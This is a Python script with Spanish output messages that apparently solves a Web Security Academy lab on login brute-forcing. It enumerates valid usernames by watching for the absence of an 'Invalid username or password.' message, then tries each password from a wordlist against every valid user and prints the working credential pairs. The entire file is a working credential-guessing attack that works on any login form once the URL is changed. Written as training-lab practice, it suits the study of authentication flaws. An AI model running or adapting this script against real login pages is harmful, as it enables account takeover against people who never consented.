import requests, signal, sys, re

def read_file(file):
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def valid_username(url, usernames, pattern):

    valid_usernames = []

    for username in usernames:
        response_user = requests.post(url=url,data={"username":username,"password":"qwerty"})
        print("Usuario: {}\t\tlongitud: {}".format(username,len(response_user.content)))
 
        if re.search(pattern, re.sub(re.compile('<.*?>'), '', response_user.text)):
            pass
        else:
            valid_usernames.append(username)

    print("\nLos usuarios validos son: {}".format(','.join(valid_usernames)))
    return valid_usernames

def valid_password(url, valid_usernames, passwords, pattern):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            response_pass = requests.post(url=url,data={"username":username,"password":password})
            print("Validando password: {}\t\tpara usuario: {}\t\tLongitud: {}".format(password,username,len(response_pass.content)))
            
            if re.search(pattern, re.sub(re.compile('<.*?>'), '', response_pass.text)):
                pass
            else:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    for key, value in valid_passwords.items():
        print("{}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://ac171f581e74979d80df249500c4007b.web-security-academy.net/login"
    pattern = "Invalid username or password."


    print("\n[*] Validando username\n")
    usernames = read_file("usernames")
    valid_usernames = valid_username(url, usernames, pattern)

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords, pattern)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()